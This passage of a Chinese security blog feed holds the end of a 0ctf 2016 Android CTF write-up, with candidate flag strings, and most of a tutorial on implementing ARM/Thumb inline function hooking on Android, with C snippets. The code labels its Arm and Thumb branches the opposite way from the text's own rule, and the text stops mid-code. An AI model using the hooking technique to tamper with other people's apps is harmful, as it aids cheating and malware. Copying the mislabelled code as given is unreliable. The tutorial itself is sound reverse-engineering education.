&lt;p&gt;最后吐槽一下，这道题毫无技术含量，逻辑也有很大问题。从技术来看，只要具备基本的Android逆向技能，就能定位到&lt;code&gt;ControlLayer::updateScore(int)&lt;/code&gt;，事实上，我用了5分钟就找到了这个函数，但是到最后找到Flag用了几个小时。按照题目得到最高分的提示，我直接在上层函数修改了分数为1000000000分，得到字符串为&lt;code&gt;MGN0ZntDMGNvUzJkX0FuRHJv4wdz99&lt;/code&gt;。我继续尝试修改分数为2147483647（32位有符号整数的最大值），得到字符串为&lt;code&gt;MGN0ZntDMGNvUzJkX0FuRHJvdz99&lt;/code&gt;。然后又设想了整数溢出之类的问题。最后的答案竟然是把所有分数的字符串全部拼在一起，我不知道这样拼凑和&lt;code&gt;play the game, get the highest score&lt;/code&gt;有什么联系，并且正确的Flag几乎不可能出现在CocosdxPrefsfile.xml中。&lt;br&gt;讲道理而论，这道题真的浪费了我几个小时的青春（当然不排除我不玩ctf，too young too simple,sometimes naive）。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文为2016年0ctf中的mobile题目boomshakalaka的writeup。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android Arm Inline Hook</title>
    <link href="http://ele7enxxh.com/Android-Arm-Inline-Hook.html"/>
    <id>http://ele7enxxh.com/Android-Arm-Inline-Hook.html</id>
    <published>2016-01-27T03:55:00.000Z</published>
    <updated>2016-03-23T06:25:27.000Z</updated>
    
    <content type="html">&lt;p&gt;本文将结合&lt;a href=&quot;https://github.com/ele7enxxh/Android-Inline-Hook&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;本项目&lt;/a&gt;的源代码，详细阐述Android Arm Inline Hook的原理与实现过程。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;什么是Inline-Hook&quot;&gt;&lt;a href=&quot;#什么是Inline-Hook&quot; class=&quot;headerlink&quot; title=&quot;什么是Inline Hook&quot;&gt;&lt;/a&gt;什么是Inline Hook&lt;/h2&gt;&lt;p&gt;Inline Hook即内部跳转Hook，通过替换函数开始处的指令为跳转指令，使得原函数跳转到自己的函数，通常还会保留原函数的调用接口。与GOT表Hook相比，Inline Hook具有更广泛的适用性，几乎可以Hook任何函数，不过其实现更为复杂，考虑的情况更多，并且无法对一些太短的函数Hook。&lt;br&gt;其基本原理请参阅网上其他资料。&lt;/p&gt;
&lt;h2 id=&quot;需要解决的问题&quot;&gt;&lt;a href=&quot;#需要解决的问题&quot; class=&quot;headerlink&quot; title=&quot;需要解决的问题&quot;&gt;&lt;/a&gt;需要解决的问题&lt;/h2&gt;&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;Arm模式与Thumb模式的区别&lt;/li&gt;
&lt;li&gt;跳转指令的构造&lt;/li&gt;
&lt;li&gt;PC相关指令的修正&lt;/li&gt;
&lt;li&gt;线程处理&lt;/li&gt;
&lt;li&gt;其他一些细节&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;下面我将结合源码对这几个问题进行解决。&lt;/p&gt;
&lt;h2 id=&quot;Arm模式与Thumb模式的区别&quot;&gt;&lt;a href=&quot;#Arm模式与Thumb模式的区别&quot; class=&quot;headerlink&quot; title=&quot;Arm模式与Thumb模式的区别&quot;&gt;&lt;/a&gt;Arm模式与Thumb模式的区别&lt;/h2&gt;&lt;p&gt;本文讨论的对象为基于32位的Arm架构的Inline Hook，在Arm版本7及以上的体系中，其指令集分为Arm指令集和Thumb指令集。Arm指令为4字节对齐，每条指令长度均为32位；Thumb指令为2字节对齐，又分为Thumb16、Thumb32，其中Thumb16指令长度为16位，Thumb32指令长度为32位。&lt;br&gt;在对一个函数进行Inline Hook时，首先需要判断当前函数指令是Arm指令还是Thumb指令，指令使用目标地址值的bit[0]来确定目标地址的指令类型。bit[0]的值为1时，目标程序为Thumb指令；bit[0]值为0时，目标程序为ARM指令。其相关实现代码为以下宏：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 设置bit[0]的值为1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; SET_BIT0(addr)		(addr | 1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 设置bit[0]的值为0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; CLEAR_BIT0(addr)	(addr &amp;amp; 0xFFFFFFFE)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 测试bit[0]的值，若为1则返回真，若为0则返回假&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; TEST_BIT0(addr)		(addr &amp;amp; 1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;跳转指令的构造&quot;&gt;&lt;a href=&quot;#跳转指令的构造&quot; class=&quot;headerlink&quot; title=&quot;跳转指令的构造&quot;&gt;&lt;/a&gt;跳转指令的构造&lt;/h2&gt;&lt;p&gt;跳转指令主要分为以下两种：&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;B系列指令：B、BL、BX、BLX&lt;/li&gt;
&lt;li&gt;直接写PC寄存器&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;Arm的B系列指令跳转范围只有4M，Thumb的B系列指令跳转范围只有256字节，然而大多数情况下跳转范围都会大于4M，故我们采用&lt;code&gt;LDR PC, [PC, ?]&lt;/code&gt;构造跳转指令。另外Thumb16指令中并没有合适的跳转指令，如果单独使用Thumb16指令构造跳转指令，需要使用更多的指令完成，并且在后续对PC相关指令的修正也更加繁琐，故综合考虑下，决定放弃对ARMv5的支持。&lt;br&gt;另外，Arm处理器采用3级流水线来增加处理器指令流的速度，也就是说程序计数器R15(PC)总是指向“正在取指”的指令，而不是指向“正在执行”的，即PC总是指向当前正在执行的指令地址再加2条指令的地址。比如当前指令地址是0×8000， 那么当前pc的值，在thumb下面是0×8000 + 2 &lt;em&gt; 2， 在arm下面是0×8000 + 4 &lt;/em&gt; 2。&lt;br&gt;对于Arm指令集，跳转指令为：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;LDR PC, [PC, #-4]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;addr&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;LDR PC, [PC, #-4]&lt;/code&gt;对应的机器码为：0xE51FF004，&lt;code&gt;addr&lt;/code&gt;为要跳转的地址。该跳转指令范围为32位，对于32位系统来说即为全地址跳转。&lt;br&gt;对于Thumb32指令集，跳转指令为：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;LDR.W PC, [PC, #0]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;addr&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;LDR.W PC, [PC, #0]&lt;/code&gt;对应的机器码为：0x00F0DFF8，&lt;code&gt;addr&lt;/code&gt;为要跳转的地址。同样支持任意地址跳转。&lt;br&gt;其相关实现代码为：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// Arm Mode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (TEST_BIT0(item-&amp;gt;target_addr)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (CLEAR_BIT0(item-&amp;gt;target_addr) % &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		((&lt;span class=&quot;keyword&quot;&gt;uint16_t&lt;/span&gt; *) CLEAR_BIT0(item-&amp;gt;target_addr))[i++] = &lt;span class=&quot;number&quot;&gt;0xBF00&lt;/span&gt;;  &lt;span class=&quot;comment&quot;&gt;// NOP&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	((&lt;span class=&quot;keyword&quot;&gt;uint16_t&lt;/span&gt; *) CLEAR_BIT0(item-&amp;gt;target_addr))[i++] = &lt;span class=&quot;number&quot;&gt;0xF8DF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	((&lt;span class=&quot;keyword&quot;&gt;uint16_t&lt;/span&gt; *) CLEAR_BIT0(item-&amp;gt;target_addr))[i++] = &lt;span class=&quot;number&quot;&gt;0xF000&lt;/span&gt;;	&lt;span class=&quot;comment&quot;&gt;// LDR.W PC, [PC]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	((&lt;span class=&quot;keyword&quot;&gt;uint16_t&lt;/span&gt; *) CLEAR_BIT0(item-&amp;gt;target_addr))[i++] = item-&amp;gt;new_addr &amp;amp; &lt;span class=&quot;number&quot;&gt;0xFFFF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	((&lt;span class=&quot;keyword&quot;&gt;uint16_t&lt;/span&gt; *) CLEAR_BIT0(item-&amp;gt;target_addr))[i++] = item-&amp;gt;new_addr &amp;gt;&amp;gt; &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// Thumb Mode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	((&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt; *) (item-&amp;gt;target_addr))[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] = &lt;span class=&quot;number&quot;&gt;0xe51ff004&lt;/span&gt;;	&lt;span class=&quot;comment&quot;&gt;// LDR PC, [PC, #-4]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	((&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt; *) (item-&amp;gt;target_addr))[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] = item-&amp;gt;new_addr;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;首先通过TEST_BIT0宏判断目标函数的指令集类型，其中若为Thumb指令集，多了下面一个额外处理：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (CLEAR_BIT0(item-&amp;gt;target_addr) % &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	((&lt;span class=&quot;keyword&quot;&gt;uint16_t&lt;/span&gt; *) CLEAR_BIT0(item-&amp;gt;target_addr))[i++] = &lt;span class=&quot;number&quot;&gt;0xBF00&lt;/span&gt;;  &lt;span class=&quot;comment&quot;&gt;// NOP&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;对bit[0]的值清零，若其值4字节不对齐，则添加一个2字节的&lt;code&gt;NOP&lt;/code&gt;指令，使得后续的指令4字节对齐。这是因为在Thumb32指令中，若该指令对PC寄存器的值进行了修改，则该指令必须是4字节对齐的，否则为非法指令。&lt;/p&gt;
&lt;h2 id=&quot;PC相关指令的修正&quot;&gt;&lt;a href=&quot;#PC相关指令的修正&quot; class=&quot;headerlink&quot; title=&quot;PC相关指令的修正&quot;&gt;&lt;/a&gt;PC相关指令的修正&lt;/h2&gt;&lt;p&gt;不论是Arm指令集还是Thumb指令集，都存在很多的与PC值相关的指令，例如：B系列指令、literal系列指令等。原有函数的前几个被跳转指令替换的指令将会被搬移到trampoline_instructions中，此时PC值已经变动，所以需要对PC相关指令进行修正（所谓修正即为计算出实际地址，并使用其他指令完成同样的功能）。相关修正代码位于relocate.c文件中。其中&lt;code&gt;INSTRUCTION_TYPE&lt;/code&gt;描述了需要修正的指令，限于篇幅，这里仅阐述Arm指令的修正过程，对应的代码为&lt;code&gt;relocateInstructionInArm&lt;/code&gt;函数。&lt;br&gt;函数原型如下：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;target_addr: 待Hook的目标函数地址，即为当前PC值，用于修正指令&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;orig_instructions：存放原有指令的首地址，用于修正指令和后续对原有指令的恢复&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;length：存放的原有指令的长度，Arm指令为8字节；Thumb指令为12字节&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;trampoline_instructions：存放修正后指令的首地址，用于调用原函数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;orig_boundaries：存放原有指令的指令边界（所谓边界即为该条指令与起始地址的偏移量），用于后续线程处理中，对PC的迁移&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;trampoline_boundaries：存放修正后指令的指令边界，用途与上相同&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;count：处理的指令项数，用途与上相同&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;relocateInstructionInArm&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt; target_addr, &lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt; *orig_instructions, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; length, &lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt; *trampoline_instructions, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; *orig_boundaries, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; *trampoline_boundaries, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; *count)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;具体实现中，首先通过函数&lt;code&gt;getTypeInArm&lt;/code&gt;判断当前指令的类型，本函数通过类型，共分为4个处理分支：&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;BLX_ARM、BL_ARM、B_ARM、BX_ARM&lt;/li&gt;
&lt;li&gt;ADD_ARM&lt;/li&gt;
&lt;li&gt;ADR1_ARM、ADR2_ARM、LDR_ARM、MOV_ARM&lt;/li&gt;
&lt;li&gt;其他指令&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;BLX-ARM、BL-ARM、B-ARM、BX-ARM指令的修正&quot;&gt;&lt;a href=&quot;#BLX-ARM、BL-ARM、B-ARM、BX-ARM指令的修正&quot; class=&quot;headerlink&quot; title=&quot;BLX_ARM、BL_ARM、B_ARM、BX_ARM指令的修正&quot;&gt;&lt;/a&gt;BLX_ARM、BL_ARM、B_ARM、BX_ARM指令的修正&lt;/h3&gt;&lt;p&gt;即为B系列指令（&lt;code&gt;BLX &amp;lt;label&amp;gt;&lt;/code&gt;、&lt;code&gt;BL &amp;lt;label&amp;gt;&lt;/code&gt;、&lt;code&gt;B &amp;lt;label&amp;gt;&lt;/code&gt;、&lt;code&gt;BX PC&lt;/code&gt;）的修正，其中&lt;code&gt;BLX_ARM&lt;/code&gt;和&lt;code&gt;BL_ARM&lt;/code&gt;需要修正LR寄存器的值，相关代码为：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (type == BLX_ARM || type == BL_ARM) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	trampoline_instructions[trampoline_pos++] = &lt;span class=&quot;number&quot;&gt;0xE28FE004&lt;/span&gt;;	&lt;span class=&quot;comment&quot;&gt;// ADD LR, PC, #4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;接下来构造相应的跳转指令，即为：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;trampoline_instructions[trampoline_pos++] = &lt;span class=&quot;number&quot;&gt;0xE51FF004&lt;/span&gt;;  	&lt;span class=&quot;comment&quot;&gt;// LDR PC, [PC, #-4]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最后解析指令，计算实际跳转地址&lt;code&gt;value&lt;/code&gt;，并将其写入&lt;code&gt;trampoline_instructions&lt;/code&gt;，相关代码为：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (type == BLX_ARM) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	x = ((instruction &amp;amp; &lt;span class=&quot;number&quot;&gt;0xFFFFFF&lt;/span&gt;) &amp;lt;&amp;lt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) | ((instruction &amp;amp; &lt;span class=&quot;number&quot;&gt;0x1000000&lt;/span&gt;) &amp;gt;&amp;gt; &lt;span class=&quot;number&quot;&gt;23&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (type == BL_ARM || type == B_ARM) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	x = (instruction &amp;amp; &lt;span class=&quot;number&quot;&gt;0xFFFFFF&lt;/span&gt;) &amp;lt;&amp;lt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	x = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;top_bit = x &amp;gt;&amp;gt; &lt;span class=&quot;number&quot;&gt;25&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;imm32 = top_bit ? (x | (&lt;span class=&quot;number&quot;&gt;0xFFFFFFFF&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&quot;number&quot;&gt;26&lt;/span&gt;)) : x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (type == BLX_ARM) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	value = pc + imm32 + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; 